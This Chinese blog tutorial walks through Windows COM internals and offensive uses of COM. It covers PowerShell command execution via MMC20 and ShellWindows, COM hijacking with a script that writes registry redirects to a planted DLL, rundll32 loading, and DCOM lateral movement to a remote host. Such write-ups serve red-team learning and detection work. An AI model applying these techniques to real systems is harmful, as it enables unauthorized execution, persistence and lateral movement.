<p><img src="/2022/11/12/inject/image-20221028093840014.png" alt="image-20221028093840014"></p>
<p>参考文章：</p>
<p><a href="https://github.com/hasherezade/process_doppelganging">https://github.com/hasherezade/process_doppelganging</a></p>
<p><a href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/">https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag> windows</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>com的从0到1</title>
    <url>/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/</url>
    <content><![CDATA[<p>本文首发于跳跳糖社区，原文链接：<a href="https://tttang.com/archive/1824/">https://tttang.com/archive/1824/</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是作者从0到1学习com的一个过程，记录了从初识com到com的武器化利用以及挖掘。com组件博大精深，无论是从开发的角度还是安全的角度都非常值得研究，本文仅作入门贴。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>对于com的基本认知，摘自头像哥博客。对于com，个人没有系统的读过微软的文档，一直都不怎么了解，头像哥的这几个总结比较适合我这种懒的读文档的人初步了解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.在设计层面，COM模型分为`接口`与`实现`。 </span><br><span class="line">例如计划任务示例代码中的`ITaskService`。</span><br><span class="line"></span><br><span class="line">2.区分COM组件的唯一标识为`Guid`，分别为针对接口的`IID（Interface IDentifier）`与针对类的`CLSID（CLaSs IDentifier）`。</span><br><span class="line">例如`CLSID_TaskScheduler`定义为`0F87369F-A4E5-4CFC-BD3E-73E6154572DD`。</span><br><span class="line"></span><br><span class="line">3.COM组件需要在注册表内进行注册才可进行调用。通常情况下，系统预定义组件注册于`HKEY_LOCAL_MACHINE\SOFTWARE\Classes`，用户组件注册于`HKEY_CURRENT_USER\SOFTWARE\Classes`。`HKEY_CLASSES_ROOT`为二者合并后的视图，在系统服务角度等同于`HKEY_LOCAL_MACHINE\SOFTWARE\Classes`。</span><br><span class="line">例如计划任务组件的注册信息注册于`HKEY_CLASSES_ROOT\CLSID\&#123;0f87369f-a4e5-4cfc-bd3e-73e6154572dd&#125;`。</span><br><span class="line"></span><br><span class="line">4.Windows最小的可独立运行单元是进程，最小的可复用的代码单元为类库，所以COM同样存在`进程内（In-Process）`与`进程外（Out-Of-Process）`两种实现方式。多数情况下，进程外COM组件为一个exe，进程内COM组件为一个dll。</span><br><span class="line">例如计划任务的COM对象为进程内组件，由`taskschd.dll`实现。</span><br><span class="line"></span><br><span class="line">5.为方便COM组件调用，可以通过`ProgId（Programmatic IDentifier）`为`CLSID`指定别名。</span><br><span class="line">例如计划任务组件的ProgId为`Schedule.Service.1`。</span><br><span class="line"></span><br><span class="line">6.客户端调用`CoCreateInstance`、`CoCreateInstanceEx`、`CoGetClassObject`等函数时，将创建具有指定`CLSID`的对象实例，这个过程称为`激活（Activation）`。</span><br><span class="line">例如微软示例代码中的`CoCreateInstance(CLSID_TaskScheduler,....)`。</span><br><span class="line"></span><br><span class="line">7.COM采用`工厂模式(class factory)`对调用方与实现方进行解耦，包括进程内外COM组件激活、通信、转换，`IUnknown::QueryInterface`和`IClassFactory`始终贯穿其中。</span><br><span class="line">例如微软示例代码中的一大堆`QueryInterface`。</span><br></pre></td></tr></table></figure>

<p>还是有必要自己读一下官方文档，第一遍读大部分官方术语是不太理解的，无伤大雅，能理解多少就理解多少。下面是我自己阅读官方文档总结的一些小点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.com程序一般是dll文件，被提供给主程序调用。不同的com程序具有不同的接口，但是所有的接口都是从class factory 和 IUnknown接口获得的。所以com程序必须实现 class factory 和 Iunknown接口</span><br><span class="line"></span><br><span class="line">2.接口是实现对对象数据访问的函数集，而接口的函数称为方法。每个接口都有自己的唯一接口标识符，叫IID， IID也是一个GUID(全局唯一标识符)。</span><br><span class="line">  在定义接口时，用IDL来定义，使用MIDL编译会生成对应的都文件，根据头文件我们自己实现编程调用</span><br><span class="line">  </span><br><span class="line">3.IUnKnown接口</span><br><span class="line"> 所有COM接口都继承自IUnKnown接口，该接口具有3个成员函数，QueryInterface、AddRef、Release. </span><br><span class="line"> </span><br><span class="line">4.CoCreateInstance 函数创建com实例并返回客户端请求的接口指针。客户端指的是将CLSID传递给系统并请求com对象实例的调用方，这里个人理解为编程人员的代码获取com服务器的指针，并调用接口的方法使用com服务，服务器端指的是向系统提供COM对象的模块</span><br><span class="line">com服务器主要有两种，进程内和进程外，进程内服务器在dll中实现，进程外服务器在exe中实现。</span><br><span class="line">如果要创建com对象，com服务器需要提供 IClassFactory 接口的实现，而且 IClassFactory 包含 CreateInstance方法。</span><br><span class="line">IUnknown::QueryInterface和IClassFactory始终贯穿在com组件的调用中。</span><br><span class="line"></span><br><span class="line">5.在注册com服务器的时候，如果是进程内注册，即dll，dll必须导出以下函数</span><br><span class="line">DllRegisterServer</span><br><span class="line">DllUnregisterServer</span><br><span class="line">注册是将com对象写进注册表，自然离不开注册表的一系列函数</span><br><span class="line">RegOpenKey</span><br><span class="line">RegCreateKey</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">6.几乎所有的COM函数和接口方法都返回HRESULT类型的值，但HRESULT不是句柄</span><br></pre></td></tr></table></figure>



<p>com与注册表的关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性</span><br><span class="line">HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息</span><br><span class="line">HKEY_CURRENT_USER 用于存储当前用户配置项</span><br><span class="line">HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项</span><br><span class="line">HKEY_LOCAL_MACHINE 用于存储当前用户物理状态</span><br><span class="line">HKEY_USERS 用于存储新用户的默认配置项</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221101004116577.png" alt="image-20221101004116577"></p>
<p>com调用需要的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.CLSID</span><br><span class="line">2.IID</span><br><span class="line">3.虚函数表</span><br><span class="line">4.方法签名</span><br></pre></td></tr></table></figure>

<p>整理以后制作IDL，获取到IDL之后，就可以使用合适的语言进行调用</p>
<p>GUID 用于在系统中唯一标识一个对象，CLSID(类标识符)是GUID在注册表中的表示，用于在注册表中唯一标识一个com类对象。guid在标识接口时称为IID（接口标识符）</p>
<p>每一个注册的clsid表项中都含有一个 <code>InprocServer32</code>的子项，该子项内有映射到该com二进制文件的键值对，操作系统通过该键值对将com二进制文件载入进程。</p>
<p><code>InprocServer32</code>表示的是dll的实现路径，<code>LocalServer32</code>表示的是exe的实现路径</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221105121211445.png" alt="image-20221105121211445"></p>
<h1 id="com利用"><a href="#com利用" class="headerlink" title="com利用"></a>com利用</h1><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>枚举com对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gwmi Win32_COMSetting | ? &#123;$_.progid &#125; | sort | ft ProgId,Caption,InprocServer32</span><br></pre></td></tr></table></figure>

<p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a></p>
<p><strong>在调用函数的时候需要注意，如果CLSID子项带有ProgID的话需要指定ProgID调用方法或属性</strong></p>
<p>可以查看com对象的方法</p>
<p>如下，该类型库公开了start方法，接受bool传参以及commandLine方法</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221107151218085.png" alt="image-20221107151218085"></p>
<p>对com组件的利用可以直接使用powershell调用接口执行命令</p>
<p>这里可以调用mmc执行命令 ，后文会讲到，mmc还支持远程调用，等到DCOM那里会提</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$handle</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application.1&quot;</span>))</span><br><span class="line"><span class="variable">$handle</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&quot;cmd&quot;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc&quot;</span>,<span class="string">&quot;7&quot;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108095405673.png" alt="image-20221108095405673"></p>
<p>另一种调用COM执行命令    ShellWindows</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hb</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromCLSID(<span class="string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>)) </span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$hb</span>.Item() </span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221109000628685.png" alt="image-20221109000628685"></p>
<p>等等……还有很多</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$shell</span> = [<span class="type">Activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromCLSID(<span class="string">&quot;72C24DD5-D70A-438B-8A42-98424B88AFB8&quot;</span>))</span><br><span class="line"><span class="variable">$shell</span>.Run(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure>





<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>通过调用<code>ITaskFolder::registerTask</code> 来注册计划任务</p>
<p>这里头像哥讲的很通俗，可以参考</p>
<p><a href="http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html">http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html</a></p>
<p>根据微软官方稍作修改，实现dll武器化</p>
<p><a href="https://github.com/0range-x/dll_weapon/blob/main/schtask.cpp2">https://github.com/0range-x/dll_weapon/blob/main/schtask.cpp2</a></p>
<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>利用com实现进程注入，没有调用CreateProcess等常规api，而是调用<a href="https://docs.microsoft.com/en-us/windows/win32/winauto/getprocesshandlefromhwnd">oleacc!GetProcessHandleFromHwnd()</a>，利用 <code>IRundown::DoCallback()</code>执行命令，并且该接口需要一个IPID和OXID值来执行代码。该接口也不是公开的方法，需要手动去逆，来实现武器化</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111010506617.png" alt="image-20221111010506617"></p>
<p>本人在复现时注入失败，根据报错查看，在调用com接口的时候连接失败，猜测是微软已经修复。</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111011007974.png" alt="image-20221111011007974"></p>
<p>代码实现</p>
<p><a href="https://github.com/mdsecactivebreach/com_inject">https://github.com/mdsecactivebreach/com_inject</a></p>
<h1 id="com劫持"><a href="#com劫持" class="headerlink" title="com劫持"></a>com劫持</h1><p>我们知道dll劫持的原理是利用加载dll的路径顺序，替换原dll为恶意dll，那么com劫持是不是也是类似的呢</p>
<p>com组件的加载过程如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID</span><br><span class="line">HKCR\CLSID</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\</span><br></pre></td></tr></table></figure>

<p>可以看到<code>HKCU</code>的优先级高于<code>HKCR</code>高于<code>HKLM</code></p>
<p>那我们的目标就很明显了，劫持目标选择 <code>HKCU\Software\Classes\CLSID</code>，这样就会先加载我们的恶意dll。</p>
<p>与dll劫持不同的是，dll劫持只能劫持dll，com劫持可以劫持 com文件、pe文件、api文件等</p>
<p>步骤就是修改注册表的路径，指向我们的恶意路径，和白加黑一样</p>
<h3 id="利用缺失的CLSID"><a href="#利用缺失的CLSID" class="headerlink" title="利用缺失的CLSID"></a>利用缺失的CLSID</h3><p>尝试一下对计算器进行com劫持，寻找 在<code>InprocServer32</code>下缺失的CLSID</p>
<p>因为修改<code>InprocServer32</code>下的dll需要一定权限，所以该方法需要管理员权限</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108094138806.png" alt="image-20221108094138806"></p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108103634466.png" alt="image-20221108103634466"></p>
<p>保存并导出为csv</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108110325690.png" alt="image-20221108110325690">)</p>
<p>python实现自动化替换路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inject</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.path=<span class="string">&#x27;Logfile.CSV&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.path,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">            g=csv.DictReader(r)</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> g:</span><br><span class="line">                z=[x <span class="keyword">for</span> x <span class="keyword">in</span> name]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> z:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;HK&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(name[i]):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;reg add &#123;&#125; /ve /t REG_SZ /d C:\\Users\\Administrator\\Desktop\\test\\Dll64.dll /f&#x27;</span>.<span class="built_in">format</span>(name[i]),file=<span class="built_in">open</span>(<span class="string">&#x27;com_hijack.bat&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    obj=Inject()</span><br><span class="line">    obj.add()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!] Administrator run com_hijack.bat&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>生成bat后需要管理员权限打开，再次打开calc发现已经成功劫持</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108110714769.png" alt="image-20221108110714769"></p>
<p>该方法有个明显的缺点，就是需要管理员权限。</p>
<p>所以这里出现了第二种方法</p>
<h3 id="覆盖COM键"><a href="#覆盖COM键" class="headerlink" title="覆盖COM键"></a>覆盖COM键</h3><p>原理：在<code>HKCU</code>注册表中添加键值后，当com对象被调用，<code>HKLM</code>中的键值就会被覆盖(并且添加到<code>HKCR</code>)中</p>
<p>先使用oleview.net来过滤程序启动权限为空的id</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108113614413.png" alt="image-20221108113614413"></p>
<p>设置过滤规则</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108114326835.png" alt="image-20221108114326835"></p>
<p>随手点开一个</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108114630484.png" alt="image-20221108114630484"></p>
<p>查看clsid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADDA2EBE-0BA0-4FEA-A1DE-2F3C7C596099</span><br></pre></td></tr></table></figure>

<p>可以看到调用的dll</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108114730929.png" alt="image-20221108114730929"></p>
<p>找到该CLSID对应的dll</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108115102525.png" alt="image-20221108115102525"></p>
<p>修改加载的dll为恶意dll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Mozilla Firefox\notificationserver.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108115321155.png" alt="image-20221108115321155"></p>
<p>但在启动的时候，发现并没有劫持成功</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108121002047.png" alt="image-20221108121002047"></p>
<p>这里猜测可能是因为该dll没有被调用，需要特定服务才能调用，火狐不是那么通用，也也不清楚具体是哪个服务进行调用</p>
<p>下面换一个计算器来进行演示</p>
<h5 id="劫持ie"><a href="#劫持ie" class="headerlink" title="劫持ie"></a>劫持ie</h5><p>这里选择ie浏览器进行劫持，对应的CLSID为<code>&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</code>，且该劫方法不需要高权限</p>
<p>可以看到本来的注册表项键值</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108123106134.png" alt="image-20221108123106134"></p>
<p>修改注册表</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108132956508.png" alt="image-20221108132956508"></p>
<p>启动ie浏览器，劫持成功</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108133213720.png" alt="image-20221108133213720"></p>
<h6 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h6><p><a href="https://github.com/0range-x/windows/blob/main/dll_weapon/ieHijack.cpp">https://github.com/0range-x/windows/blob/main/dll_weapon/ieHijack.cpp</a></p>
<h1 id="com注册表的滥用"><a href="#com注册表的滥用" class="headerlink" title="com注册表的滥用"></a>com注册表的滥用</h1><h3 id="LocalServer32"><a href="#LocalServer32" class="headerlink" title="LocalServer32"></a>LocalServer32</h3><p>枚举所有<code>LocalServer32</code>键值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$inproc = gwmi Win32_COMSetting | ?&#123; $_.LocalServer32 -ne $null &#125;</span><br><span class="line">$inproc | ForEach &#123;$_.LocalServer32&#125; &gt; values.txt</span><br><span class="line"></span><br><span class="line">gwmi Win32_COMSetting -computername 127.0.0.1 | ft LocalServer32 -autosize | Out-String -width 4096 | out-file dcom_exes.txt</span><br><span class="line"></span><br><span class="line">gwmi Win32_COMSetting -computername 127.0.0.1 | ft InProcServer32 -autosize | Out-String -width 4096 | out-file dcom_dlls.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108163132551.png" alt="image-20221108163132551"></p>
<p>寻找<code>File not Found</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$paths = gc .\values.txt</span><br><span class="line">foreach ($p in $paths)&#123;$p;cmd /c dir $p &gt; $null&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108163300670.png" alt="image-20221108163300670"></p>
<p>找exe的文件夹路径，这里手工尝试了不少，但是没有发现everyone权限的文件夹路径</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108213025496.png" alt="image-20221108213025496"></p>
<p>这里个人觉得寻找exe的效率很低，不如花时间去找dll实现武器化，毕竟dll的数量更多，利用的可能性更大</p>
<h3 id="InprocServer32"><a href="#InprocServer32" class="headerlink" title="InprocServer32"></a>InprocServer32</h3><p>枚举所有<code>InprocServer32</code>中的键值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$inproc = gwmi Win32_COMSetting | ?&#123; $_.InprocServer32 -ne $null &#125;</span><br><span class="line">$paths = $inproc | ForEach &#123;$_.InprocServer32&#125; &gt; demo.txt</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108163120722.png" alt="image-20221108163120722"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$paths = gc .\demo.txt</span><br><span class="line">foreach ($p in $paths)&#123;$p;cmd /c dir $p &gt; $null&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108163606393.png" alt="image-20221108163606393"></p>
<p>同样的，找文件夹的权限路径，如果everyone可写，可以替换恶意dll，然后使用rundll32加载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32.exe -sta &#123;CLSID&#125;</span><br></pre></td></tr></table></figure>



<h1 id="DCOM横移"><a href="#DCOM横移" class="headerlink" title="DCOM横移"></a>DCOM横移</h1><p>com是在计算机本地的实现，DCOM是COM的进一步扩展，DCOM通过远程过程调用(RPC)将com的功能在远程计算机上实现，可以将DCOM理解为通过RPC实现的COM。</p>
<p>调用DCOM需要的条件。</p>
<p>通常情况下，调用DCOM连接到远程计算机的时候，我们已经具有了本地管理员的权限</p>
<p>在很多com对象都看到APPid和CLSID是一个值，这里暂且将他们理解为CLSID的不同表示，就像GUID和CLSID一样</p>
<p>枚举支持DCOM的应用程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-CimInstance -class Win32_DCOMApplication | select appid,name</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108233828325.png" alt="image-20221108233828325"></p>
<p>使用DCOM执行命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$com</span> =[<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView | <span class="built_in">gm</span>			//查看方法</span><br></pre></td></tr></table></figure>

<p>看到执行命令的方法</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108234815550.png" alt="image-20221108234815550"></p>
<p>调用执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221108234902647.png" alt="image-20221108234902647"></p>
<p>远程调用,需要关闭防火墙</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$com</span> =[<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.135.246&quot;</span>)) </span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>另一种组件实现</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$com</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;192.168.135.246&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<p>除了这两种方法，支持DCOM调用的还有很多公开的方法，这里不再一一列举，需要注意的是，不同的组件对不同的操作系统兼容性不同，建议投入实战前先测试兼容性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Methods						APPID</span><br><span class="line">MMC20.Application			7e0423cd-1119-0928-900c-e6d4a52a0715</span><br><span class="line">ShellWindows				9BA05972-F6A8-11CF-A442-00A0C90A8F39</span><br><span class="line">ShellBrowserWindow			C08AFD90-F2A1-11D1-8455-00A0C91F3880</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Document.Application.ServiceStart()</span><br><span class="line">Document.Application.ServiceStop()</span><br><span class="line">Document.Application.IsServiceRunning()</span><br><span class="line">Document.Application.ShutDownWindows()</span><br><span class="line">Document.Application.GetSystemInformation()</span><br></pre></td></tr></table></figure>

<p>怎么来查找是否可以被我们利用呢？</p>
<p>可以通过oleview.net 来查找对应的CLSID和启动权限，看到这里 <code>Launch Permission</code>为空，说明普通权限即可</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221109002907879.png" alt="image-20221109002907879"></p>
<h3 id="武器化实现"><a href="#武器化实现" class="headerlink" title="武器化实现"></a>武器化实现</h3><p>c#方法</p>
<p>以shellwindows为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var CLSID = &quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;;</span><br><span class="line">Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);</span><br><span class="line">object RemoteComObject = Activator.CreateInstance(ComType);</span><br><span class="line">object Item = RemoteComObject.GetType().InvokeMember(&quot;Item&quot;, BindingFlags.InvokeMethod, null, RemoteComObject, new object[] &#123; &#125;);</span><br><span class="line">object Document = Item.GetType().InvokeMember(&quot;Document&quot;, BindingFlags.GetProperty, null, Item, null);</span><br><span class="line">object Application = Document.GetType().InvokeMember(&quot;Application&quot;, BindingFlags.GetProperty, null, Document, null);</span><br><span class="line">Application.GetType().InvokeMember(&quot;ShellExecute&quot;, BindingFlags.InvokeMethod, null, Application, new object[] &#123; BaseCommand, Parameters + &quot; &quot; + Command, Directory, null, 0 &#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到利用和powershell是一样的，只是需要一步步获取方法名，传参多一点</p>
<p>c++实现</p>
<p>实现思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.初始化com组件(CoInitializeEx)</span><br><span class="line">2.初始化com安全属性(CoInitializeSecurity)</span><br><span class="line">3.获取com组件的接口(CLSIDFromProgID)</span><br><span class="line">4.创建实例(CreateInstance)</span><br><span class="line">5.填写com组件参数</span><br><span class="line">6.清理释放(Release + CoUninitialize)</span><br></pre></td></tr></table></figure>

<p>实现demo</p>
<p><a href="https://github.com/0range-x/windows/blob/main/win32/proxychain.cpp">https://github.com/0range-x/windows/blob/main/win32/proxychain.cpp</a></p>
<h1 id="com挖掘"><a href="#com挖掘" class="headerlink" title="com挖掘"></a>com挖掘</h1><h3 id="已公开的com对象"><a href="#已公开的com对象" class="headerlink" title="已公开的com对象"></a>已公开的com对象</h3><p>可以通过下面代码遍历所有com组件和它导出的方法</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-PSDrive</span> <span class="literal">-PSProvider</span> registry <span class="literal">-Root</span> HKEY_CLASSES_ROOT <span class="literal">-Name</span> HKCR</span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> HKCR:\CLSID <span class="literal">-Name</span> | <span class="built_in">Select</span> <span class="literal">-Skip</span> <span class="number">1</span> &gt; clsids.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221105121801010.png" alt="image-20221105121801010"></p>
<p>可以查看所有的成员方法</p>
